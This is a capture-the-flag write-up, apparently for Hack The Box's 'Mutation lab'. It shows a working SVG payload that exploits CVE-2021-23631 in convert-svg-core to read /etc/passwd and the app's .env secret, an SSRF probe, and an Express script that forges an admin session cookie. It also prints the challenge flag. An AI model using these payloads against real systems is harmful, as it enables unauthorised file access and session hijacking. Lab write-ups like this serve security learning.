# Mutation lab

We are provided with a docker instance of the web application.

The homepage shows us a login page.

![1.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/1.png)

We can try some default credentials like `admin:admin` `admin:password` or something along those lines. But that did not work for me.

So we have to register a new user here.

```bash
POST /api/register HTTP/1.1
Host: 178.62.83.221:30922
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.83.221:30922/
Content-Type: application/json
Origin: http://178.62.83.221:30922
Content-Length: 48
Connection: close

{"username":"nehal","password":"vimalpanmasala"}
```

To register a user, we need to make a POST request to `/api/register` with a JSON payload that contains the username and password values.

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 46
ETag: W/"2e-RKlJkWjrPjtQ+wloc3znIL1SqqY"
Date: Fri, 20 May 2022 06:12:05 GMT
Connection: close

{"message":"Account registered successfully!"}
```

A successful account creation sends the above response.

Let us now log in.

```bash
POST /api/login HTTP/1.1
Host: 178.62.83.221:30922
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.83.221:30922/
Content-Type: application/json
Origin: http://178.62.83.221:30922
Content-Length: 48
Connection: close

{"username":"nehal","password":"vimalpanmasala"}
```

Similar to registration, login works.

 

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 46
ETag: W/"2e-FCTfdnBNtsqc3wjjuhAwgZEEoU8"
Set-Cookie: session=eyJ1c2VybmFtZSI6Im5laGFsIn0=; path=/; httponly
Set-Cookie: session.sig=92Y32jSH0QWFLC5oxDr4rUuStMY; path=/; httponly
Date: Fri, 20 May 2022 06:12:08 GMT
Connection: close

{"message":"User authenticated successfully!"}
```

In response, we can see that we are now given 2 cookies → `session` and `session.sig`.

![2.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/2.png)

We can see couple of buttons here. 

```bash
POST /api/export HTTP/1.1
Host: 178.62.83.221:30922
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.83.221:30922/dashboard
Content-Type: application/json
Origin: http://178.62.83.221:30922
Content-Length: 3320
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6Im5laGFsIn0=; session.sig=92Y32jSH0QWFLC5oxDr4rUuStMY

{"svg":"<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"500\" height=\"400\" viewBox=\"0,0,500,400\"><g fill=\"#e74c3c\" fill-rule=\"nonzero\" stroke=\"none\" stroke-width=\"1\" stroke-linecap=\"butt\" stroke-linejoin=\"miter\" stroke-miterlimit=\"10\" stroke-dasharray=\"\" stroke-dashoffset=\"0\" font-family=\"none\" font-weight=\"none\" font-size=\"none\" text-anchor=\"none\" style=\"mix-blend-mode: normal\"><path d=\"M68.27004,267.16913c-1.95297,-74.55223 -1.95297,-74.55223 -24.48284,-88.66467c-22.52988,-14.11244 -22.52988,-14.11244 -22.52988,88.46341c0,102.57585 0,102.57585 24.48284,88.66467c24.48284,-13.91118 24.48284,-13.91118 22.52988,-88.46341z\"/><path d=\"M121.97557,159.86917c52.99103,-24.49488 52.99103,-24.49488 50.10003,-80.13327c-2.891,-55.63839 -2.891,-55.63839 -75.52091,-55.63839c-72.62991,0 -72.62991,0 -72.62991,66.02083c0,66.02083 0,66.02083 22.52988,80.13327c22.52988,14.11244 22.52988,14.11244 75.52091,-10.38244z\"/><path d=\"M168.3903,339.12131c86.63255,-3.3774 94.00603,-6.10407 101.66137,-78.94585c7.65534,-72.84178 7.65534,-72.84178 -41.82857,-95.23911c-49.48391,-22.39733 -49.48391,-22.39733 -102.47494,2.09755c-52.99103,24.49488 -52.99103,24.49488 -51.03806,99.04712c1.95297,74.55223 7.04764,76.4177 93.68019,73.04029z\"/><path d=\"M46.24084,360.43902c-24.48284,13.91118 -24.48284,18.71781 10.79232,18.71781c35.27516,0 35.27516,0 27.03018,-15.38176c-8.24498,-15.38176 -13.33966,-17.24723 -37.8225,-3.33605z\"/><path d=\"M233.39257,157.63519c49.48391,22.39733 49.48391,22.39733 92.60858,0.39082c43.12467,-22.00651 43.12467,-22.00651 47.18566,-78.03572c4.06098,-56.02921 4.06098,-56.02921 -95.49958,-56.02921c-99.56056,0 -99.56056,0 -96.66956,55.63839c2.891,55.63839 2.891,55.63839 52.3749,78.03572z\"/><path d=\"M370.85844,374.11285c38.67353,0 38.67353,0 62.41938,-9.28771c23.74585,-9.28771 23.74585,-9.28771 30.42285,-86.51996c6.677,-77.23224 6.677,-77.23224 -41.6015,-105.68308c-48.2785,-28.45083 -48.2785,-28.45083 -91.40317,-6.44432c-43.12467,22.00651 -43.12467,22.00651 -50.78001,94.84829c-7.65534,72.84178 -7.65534,72.84178 22.30679,92.96428c29.96213,20.1225 29.96213,20.1225 68.63566,20.1225z\"/><path d=\"M264.21328,340.08184c-3.68674,1.36333 -3.68674,1.36333 -11.3421,20.1225c-7.65536,18.75917 -7.65536,18.75917 33.64887,18.75917c41.30422,0 41.30422,0 11.3421,-20.1225c-29.96213,-20.1225 -29.96213,-20.1225 -33.64887,-18.75917z\"/><path d=\"M477.41314,108.28416c0,-83.8504 0,-83.8504 -46.30953,-83.8504c-46.30953,0 -46.30953,0 -50.37051,56.02921c-4.06098,56.02921 -4.06098,56.02921 44.21752,84.48004c48.2785,28.45083 52.46253,27.19155 52.46253,-56.65885z\"/><path d=\"M479.58858,283.51462c0,-82.70324 -4.18403,-81.44396 -10.86103,-4.21172c-6.677,77.23224 -6.677,77.23224 2.09201,82.0736c8.76902,4.84136 8.76902,4.84136 8.76902,-77.86189z\"/><path d=\"M437.18649,370.26642c-23.74585,9.28771 -23.74585,9.28771 8.76902,9.28771c32.51487,0 32.51487,0 32.51487,-4.44636c0,-4.44636 0,-4.44636 -8.76902,-9.28771c-8.76902,-4.84136 -8.76902,-4.84136 -32.51487,4.44636z\"/><path d=\"M168.69444,379.05649c70.73222,0 70.73222,0 78.38757,-18.75917c7.65536,-18.75917 7.65536,-18.75917 -78.97719,-15.38176c-86.63255,3.3774 -86.63255,3.3774 -78.38757,18.75917c8.24498,15.38176 8.24498,15.38176 78.97719,15.38176z\"/></g></svg>"}
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 55
ETag: W/"37-YsAyd23cPSDzMd4C1dhrJEs/wEA"
Date: Fri, 20 May 2022 06:20:48 GMT
Connection: close

{"png":"/exports/db374e27440b65f1d096faf4a78c28b7.png"}
```

When we click on any one, we can see that a POST request to `/api/export` is being sent. The request expects an `svg` JSON key that has a SVG data as value.

This is interesting cause if you can submit SVGs, it can open a wide range of attack possibilities. 

One of the first that we can try is SSRF through SVG files.

An example payload would be like something below →

```xml
<svg width="200" height="200"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://example.com/image.jpg" height="200" width="200"/>
</svg>
```

Here we are embedding an `<image>` tag inside SVG file that will trigger an out-of-band connection to `[https://example.com](https://example.com)`.

Let us try that out.

```bash
POST /api/export HTTP/1.1
Host: 178.62.83.221:30922
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.83.221:30922/dashboard
Content-Type: application/json
Origin: http://178.62.83.221:30922
Content-Length: 207
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6Im5laGFsIn0=; session.sig=92Y32jSH0QWFLC5oxDr4rUuStMY

{"svg":"<svg width=\"200\" height=\"200%\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"https://nehalhacks.in\" height=\"200\" width=\"200\"/></svg>"}
```

```xml
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 657
Date: Fri, 20 May 2022 06:29:22 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Unable to derive width and height from SVG. Consider specifying corresponding options<br> &nbsp; &nbsp;at Converter.[convert] (/app/node_modules/convert-svg-core/src/Converter.js:211:13)<br> &nbsp; &nbsp;at processTicksAndRejections (node:internal/process/task_queues:96:5)<br> &nbsp; &nbsp;at async Converter.convert (/app/node_modules/convert-svg-core/src/Converter.js:114:20)<br> &nbsp; &nbsp;at async API.convert (/app/node_modules/convert-svg-core/src/API.js:80:16)<br> &nbsp; &nbsp;at async /app/routes/index.js:61:15</pre>
</body>
</html>
```

Here I have intentionally tried to create an error so that I can know how the server is handling the SVG inputs. I have defined the `height` of the SVG image as `100%`. Now the server expects an integer value here, but got a `%` character here that creates an error message.

From the error message, we can see that the server is using `convert-svg-core` for SVG parsing.

After a google search, we can see that this library has a CVE assigned - `CVE-2021-23631`.

There is a directory traversal vulnerability in this library. Using a specially crafted SVG file, an attacker could read arbitrary files from the file system and then show the file content as a converted PNG file.

A PoC by Aritra Chakraborty →

```jsx
const { convert } = require('convert-svg-to-png');
const express = require('express');
const fileSvg = `<svg-dummy></svg-dummy>
<iframe src="file:///etc/passwd" width="100%" height="1000px"></iframe>
<svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="0" class="Rrrrr" id="demo">data</text>
</svg>`;
const app = express();
app.get('/poc', async (req, res)=>{
  try {
    const png = await convert(fileSvg);
    res.set('Content-Type', 'image/png');
    res.send(png);
  } catch (e) {
    res.send("")
  }
})
app.listen(3000, ()=>{
  console.log('started');
});
```

Here an SVG image is being created.

```xml
<svg-dummy></svg-dummy>
<iframe src="file:///etc/passwd" width="100%" height="1000px"></iframe>
<svg viewBox="0 0 240 80" height="1000" width="1000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="0" class="Rrrrr" id="demo">data</text>
</svg>
```

When we convert this to SVG using the library, the contents of `/etc/passwd` are put in a PNG file.

You can learn more about the vulnerability [here](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785).

Let us try that payload in our end.

```bash
POST /api/export HTTP/1.1
Host: 178.62.83.221:30922
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://178.62.83.221:30922/dashboard
Content-Type: application/json
Origin: http://178.62.83.221:30922
Content-Length: 274
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6Im5laGFsIn0=; session.sig=92Y32jSH0QWFLC5oxDr4rUuStMY

{"svg":"<svg-dummy></svg-dummy><iframe src=\"file:///etc/passwd\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"> <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"}
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 55
ETag: W/"37-/aMHNik7huB/5J1ahWCiHNniHPw"
Date: Fri, 20 May 2022 06:41:03 GMT
Connection: close

{"png":"/exports/5b5b827cb094fd60b68cd9f93acd3e25.png"}
```

![3.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/3.png)

We can see the contents of `/etc/passwd`.

Now since we have a directory traversal here, we can easily read the source code of the application. 

We also know the absolute location of the application source code, thanks to the error that we created before.

The source code of the application is at - `/app`.

**Source code for `/app/index.js`** →

![4.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/4.png)

**Source code for `/app/database.js`** →

![5.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/5.png)

**Contents of `/app/.env`** →

![6.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/6.png)

From the `database.js`, we can see that we can not get `admin` password since it is a randomly-generated 16 bytes character. 

But from the `.env` file, we can see that we have the `SESSION_SECRET_KEY` that is used to generate the session cookie of users.

This is interesting. We can forge the admin cookie if we know the session secret and the cookie format.

Let us examine our user’s cookie now.

```bash
~ ❯ echo eyJ1c2VybmFtZSI6Im5laGFsIn0= | base64 -d
{"username":"nehal"}
```

The `session` cookie contains a Base64 encoded JSON object which contains the username.

The next cookie is `session.sig` which as the name suggests, probably contains the signature of the `session` cookie. 

So using the session secret and `session.sig` cookie, the server is checking if the `session` cookie is tampered or not.

Now our goal is to forge the `session` and `session.sig` cookies for the `admin` user.

For this we have to create a similar situation here.

We have to create a similar application that maintains the session using the same session secret. Then we have to create a session for `admin` to get his cookies.

```jsx
var cookieSession = require('cookie-session')
var express = require('express')

var app = express()

app.use(cookieSession({
  name: 'session',
  keys: ['5921719c3037662e94250307ec5ed1db']
}))

app.get('/', function (req, res, next) {
  req.session.username = "admin"
  res.end('Hacked By Nehal.')
})

app.listen(3000)
```

The above is a simple `express` application. 

It has a single route `/`. When we request for that route, a session will be created for `admin` user using the same session secret that we found in the `.env` file.

```bash
mutation-lab ❯ node app.js
```

```bash
GET / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0=; path=/; httponly
Set-Cookie: session.sig=EYdvy2mhVoEznETyhYjNYFFZM8o; path=/; httponly
Date: Fri, 20 May 2022 07:04:54 GMT
Connection: close
Content-Length: 15

Hacked By Nehal
```

We can see the forged cookie in the response `Set-Cookie` headers.

Replace our cookies with this pair of cookies to get admin session.

We can see the flag now.

![7.png](Mutation%20lab%2044ba47ec69e94b87bbab0aff5ac66764/7.png)

Flag → `HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}`

This is all in this challenge. Hope you liked the writeup 🙂

**REFERENCES:**

- https://github.com/allanlw/svg-cheatsheet
- [https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785)
- [https://expressjs.com/en/resources/middleware/cookie-session.html](https://expressjs.com/en/resources/middleware/cookie-session.html)